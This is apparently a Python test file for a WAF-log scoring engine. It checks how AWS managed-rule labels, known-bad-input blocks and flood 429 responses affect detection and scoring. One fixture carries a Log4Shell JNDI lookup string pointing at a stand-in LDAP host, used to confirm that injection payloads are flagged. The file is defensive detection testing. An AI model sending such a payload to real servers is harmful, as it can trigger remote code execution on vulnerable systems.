"""The managed rules' effect on the engine: known bad inputs are evidence, count-only labels never
touch scoring, and flood 429s stay out of "attacker time burned"."""
import random

from aa_ai import judge, scorer
from aa_ai.events import parse_waf
from aa_ai.scorer import minute_key, run
from aa_ai.scoring import combine, evaluate
from test_detection import agent_trace
from test_flood import rec
from test_scorer import NOW, FakeTable, awslogs, cfg

COUNT_LABELS = [{"name": "awswaf:managed:aws:core-rule-set:SizeRestrictions_QUERYSTRING"},
                {"name": "awswaf:managed:aws:sql-database:SQLi_QueryArguments"},
                {"name": "awswaf:managed:aws:anonymous-ip-list:HostingProviderIPList"}]


def test_known_bad_inputs_blocks_are_stored_and_read_by_detectors():
    t = FakeTable()
    recs = []
    for i in range(6):
        r = rec("203.0.113.40", ts=NOW - 60 + i * 5, path="/api/v2/search", action="BLOCK", rule="aws-known-bad-inputs")
        r["httpRequest"]["args"] = "q=${jndi:ldap://x.example/a}"
        r["labels"] = [{"name": "awswaf:managed:aws:known-bad-inputs:Log4JRCE_QUERYSTRING"}]
        recs.append(r)
    assert parse_waf(recs[0]).status == 403                  # WAF's default block, a refusal
    run(awslogs(recs), t, None, cfg(MODE="observe"), now=NOW)
    stored = [scorer._event(v) for (pk, _), v in t.items.items() if pk.startswith("net:203.0.113.0/24")]
    assert len(stored) == 6                                   # not skipped by the flood cost guard
    names = {s.name for s in evaluate(stored)}
    assert "injection_payloads" in names


def test_count_only_labels_never_change_scoring():
    random.seed(7)
    evs = agent_trace()
    base = evaluate(evs)
    for e in evs:
        e.extra["labels"] = [lb["name"] for lb in COUNT_LABELS]
    labeled = evaluate(evs)
    assert [(s.name, s.weight) for s in labeled] == [(s.name, s.weight) for s in base]
    assert combine(labeled) == combine(base)


def test_count_only_labels_are_not_shown_to_the_judge():
    t = FakeTable()
    r = rec("203.0.113.41", ts=NOW - 30)
    r["labels"] = COUNT_LABELS + [{"name": "awswaf:111:webacl:aa-ai-edge-shield:aa-ai:recon"}]
    e = parse_waf(r)
    from aa_ai.scoring import actor_key
    t.put_item(Item=scorer._item(actor_key(e), e, NOW))
    ev = judge.evidence(t, actor_key(e), None, NOW)
    assert ev["requests"]["rows"][0][5] == "recon"


def test_flood_429s_do_not_count_as_attacker_time_burned():
    t = FakeTable()
    t.put_item(Item={"pk": "FLAG", "sk": "flood:198.51.100.7", "verdict": "block", "score": 1,
                     "ips": ["198.51.100.7"], "flood": True, "exp": NOW + 900})
    recs = [rec("198.51.100.7", ts=NOW - 30 + i, action="BLOCK", rule="flagged-ip", status=429) for i in range(20)]
    recs += [rec("198.51.100.9", ts=NOW - 30 + i, action="BLOCK", rule="ip-flood-rate", status=429) for i in range(20)]
    recs += [rec("203.0.113.7", ts=NOW - 30 + i, path="/login", action="BLOCK", rule="auth-host-wide-rate", status=429)
             for i in range(5)]
    run(awslogs(recs), t, None, cfg(MODE="observe"), now=NOW)
    assert t.items[("STATM", minute_key(NOW))]["r429"] == 5
    assert t.items[("STAT", scorer.hour_key(NOW))]["r429"] == 5
